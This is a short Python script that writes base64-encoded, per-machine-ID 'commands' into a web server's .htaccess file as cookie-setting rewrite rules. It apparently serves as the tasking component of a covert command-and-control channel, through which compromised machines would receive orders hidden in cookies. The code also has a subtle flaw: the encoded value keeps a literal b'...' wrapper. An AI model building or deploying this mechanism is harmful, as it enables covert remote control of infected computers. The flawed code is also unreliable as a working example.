#!/usr/bin/env python
import io
import re
import base64
import sys

def editcommand( id, command ):
	#read the file
	with open('/var/www/html/.htaccess', 'r') as file:
		data = file.readlines()
	print(data)
	#find the indices of the old command to be replaced
	#indices = re.finditer(':', data[1])
	#indices_array = [index.start() for index in indices]
	#machine_id = re.finditer('=', data[1])
	#id_array = [index.start() for index in machine_id]

	location = 0
	encoded_string = str(base64.b64encode(command.encode('ascii')))

	#find the line in which a cookie entry for that ID is stored
	#if it doesn't exist, create a new entry
	for i in range(len(data)):
		indices = re.finditer(':', data[i])
		indices_array = [index.start() for index in indices]
		machine_id = re.finditer('=',data[i])
		id_array = [index.start() for index in machine_id]
		if i > 0 and id == data[i][id_array[0]+1:indices_array[0]]:
			print('ID was found!')
			location = i
			#get the string value of the old command and replace it
			old_command = data[location][indices_array[0]+1:indices_array[1]]
			new_data = data[location].replace(old_command,encoded_string)
			#set the new command in the data string
			data[location] = new_data
			break
	if location == 0:
		print('Creating new entry...')
		new_entry = "RewriteRule .* -  [CO=" + id + ":" + encoded_string + ":blah.com:0]\n"
		data.extend(new_entry)



	#write the new contents to the file
	with open('/var/www/html/.htaccess', 'w') as file:
		file.writelines(data)
	return True

if __name__ == "__main__":
	editcommand(*sys.argv[1:])
